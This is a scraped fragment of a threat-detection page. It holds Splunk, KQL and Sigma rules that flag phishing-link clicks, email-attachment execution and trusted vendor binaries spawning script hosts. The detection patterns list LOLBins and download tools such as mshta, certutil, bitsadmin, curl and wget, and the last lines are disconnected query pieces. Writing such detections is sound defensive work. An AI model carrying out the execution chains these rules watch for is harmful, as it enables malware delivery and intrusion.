    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

Email attachment opened from external sender Delivery High
Attachment delivery + execution by recipient — most common malware initial access.
ATT&CKT1566.001 T1204.002
Data sourcesEmail.All_Email Endpoint.Processes EmailAttachmentInfo DeviceProcessEvents
let LookbackDays = 7d;
let MalAttachments = EmailAttachmentInfo
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | project NetworkMessageId, RecipientEmailAddress,
              AttachmentFileName = FileName, AttachmentSHA256 = SHA256;
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("OUTLOOK.EXE","winword.exe","excel.exe","powerpnt.exe")
| where FileName in~ ("cmd.exe","powershell.exe","wscript.exe","cscript.exe",
                      "mshta.exe","rundll32.exe","regsvr32.exe")
| join kind=inner MalAttachments on $left.AccountUpn == $right.RecipientEmailAddress
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine,
          InitiatingProcessFileName, AttachmentFileName, AttachmentSHA256
// Sentinel doesn't have an attachment-hash table. Best approximation:
// OfficeActivity Send/Receive activity + correlate to host process spawn.
let LookbackDays = 7d;
let MailWithAttach = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation in~ ("Send","Receive")
    | where isnotempty(MessageId)
    | project EmailTime = TimeGenerated, MailboxOwnerUPN, Sender,
              Recipients, Subject, MessageId;
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName endswith "OUTLOOK.EXE"
| where NewProcessName endswith "\cmd.exe"
   or NewProcessName endswith "\powershell.exe"
   or NewProcessName endswith "\wscript.exe"
   or NewProcessName endswith "\cscript.exe"
   or NewProcessName endswith "\mshta.exe"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine,
          ParentProcessName
| order by TimeGenerated desc

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`

        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"

           or TargetFileSHA1 in~ (BadHashes)

                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),

                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,

| order by TimeGenerated desc
